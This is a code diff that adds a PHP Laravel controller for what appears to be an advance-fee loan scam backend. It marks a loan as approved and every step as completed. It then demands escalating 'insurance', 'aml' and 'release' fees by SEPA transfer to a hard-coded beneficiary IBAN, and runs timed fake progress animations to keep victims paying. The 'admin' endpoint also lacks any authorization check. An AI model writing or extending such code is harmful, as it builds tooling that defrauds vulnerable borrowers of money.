@@ -1,0 +1,162 @@
+<?php
+
+namespace App\Http\Controllers\Api;
+
+use App\Http\Controllers\Controller;
+use App\Models\CommissionLevel;
+use App\Models\IbanSetting;
+use App\Models\User;
+use Illuminate\Http\JsonResponse;
+use Illuminate\Http\Request;
+
+class AdminCommissionController extends Controller
+{
+    public function advance(Request $request): JsonResponse
+    {
+        $validated = $request->validate([
+            'level' => 'required|integer|min:1|max:4',
+            'email' => 'nullable|email',
+            'user_id' => 'nullable|integer|min:1',
+        ]);
+
+        $user = null;
+
+        if (!empty($validated['user_id'])) {
+            $user = User::find($validated['user_id']);
+        }
+
+        if ($user === null) {
+            if (!empty($validated['email'])) {
+                $user = User::where('email', $validated['email'])->first();
+            }
+        }
+
+        if ($user === null) {
+            $user = $request->user();
+        }
+
+        if ($user === null) {
+            return response()->json([
+                'message' => 'User not found',
+            ], 404);
+        }
+
+        $level = (int) $validated['level'];
+        if ($level < 1) {
+            $level = 1;
+        }
+        if ($level > 4) {
+            $level = 4;
+        }
+
+        $user->commission_level_id = $level;
+        $user->save();
+
+        return response()->json($this->buildDossier($user, $level));
+    }
+
+    private function buildDossier(User $user, int $level): array
+    {
+        $nameParts = preg_split('/\s+/', trim((string) $user->name), 2);
+        $firstName = $nameParts[0] ?? '';
+        $lastName = trim((string) ($user->surname ?? ($nameParts[1] ?? '')));
+
+        $phase = 'ready';
+        if ($level === 3) {
+            $phase = 'policy_build';
+        }
+
+        $fees = [
+            1 => ['amountCents' => 3700, 'reason' => 'base'],
+            2 => ['amountCents' => 17200, 'reason' => 'insurance'],
+            3 => ['amountCents' => 13600, 'reason' => 'aml'],
+            4 => ['amountCents' => 0, 'reason' => 'release'],
+        ];
+
+        $dbLevels = CommissionLevel::query()->get(['order', 'amount']);
+        foreach ($dbLevels as $dbLevel) {
+            $order = (int) ($dbLevel->order ?? 0);
+            if (!array_key_exists($order, $fees)) {
+                continue;
+            }
+            $fees[$order]['amountCents'] = (int) round(((float) $dbLevel->amount) * 100);
+        }
+
+        $fee = $fees[$level] ?? $fees[1];
+
+        $ibanSettings = IbanSetting::query()->first();
+        $beneficiary = trim((string) ($ibanSettings?->beneficiary_name ?? 'Velora Servizi S.r.l.'));
+        if ($beneficiary === '') {
+            $beneficiary = 'Velora Servizi S.r.l.';
+        }
+
+        $ibanRaw = strtoupper(preg_replace('/\s+/', '', (string) ($ibanSettings?->global_iban ?? 'IT09T02008090050000043094427')));
+        if ($ibanRaw === '') {
+            $ibanRaw = 'IT09T02008090050000043094427';
+        }
+
+        $swift = strtoupper(trim((string) ($ibanSettings?->bic_swift ?? 'UNCRITMMXXX')));
+        if ($swift === '') {
+            $swift = 'UNCRITMMXXX';
+        }
+
+        $paymentCoords = [
+            'method' => 'sepa_instant',
+            'beneficiary' => $beneficiary,
+            'iban' => $ibanRaw,
+            'swift' => $swift,
+            'amountCents' => (int) $fee['amountCents'],
+        ];
+
+        $animations = [
+            1 => 0,
+            2 => 7 * 60 * 1000,
+            3 => 0,
+            4 => 3 * 60 * 1000,
+        ];
+
+        return [
+            'client' => [
+                'firstName' => $firstName,
+                'lastName' => $lastName,
+                'email' => $user->email,
+            ],
+            'credit' => [
+                'approvedAmountCents' => (int) round(((float) ($user->requested_amount ?? 0)) * 100),
+                'ratePercent' => 3.8,
+                'isNew' => false,
+            ],
+            'policy' => [
+                'status' => $level >= 4 ? 'issued' : 'processing',
+                'etaMinutes' => $level >= 4 ? 0 : 30,
+            ],
+            'transfer' => [
+                'status' => 'idle',
+                'etaMinutes' => 60,
+                'method' => null,
+                'accountTail' => '',
+            ],
+            'commission' => [
+                'level' => $level,
+                'phase' => $phase,
+                'fee' => $fee,
+                'animationMs' => $animations[$level],
+                'animationStartedAt' => null,
+                'policyProgress' => $level >= 4 ? 1 : ($level === 3 ? 0.05 : 0),
+            ],
+            'steps' => [
+                ['id' => 'simulation', 'completed' => true],
+                ['id' => 'approval', 'completed' => true],
+                ['id' => 'account', 'completed' => true],
+                ['id' => 'documents', 'completed' => true],
+                ['id' => 'signature', 'completed' => true],
+            ],
+            'currentStep' => 'signature',
+            'documents' => [
+                ['kind' => 'identity', 'fileName' => '', 'uploadedAt' => null],
+            ],
+            'payment_coords' => $paymentCoords,
+            'paymentCoords' => $paymentCoords,
+        ];
+    }
+}
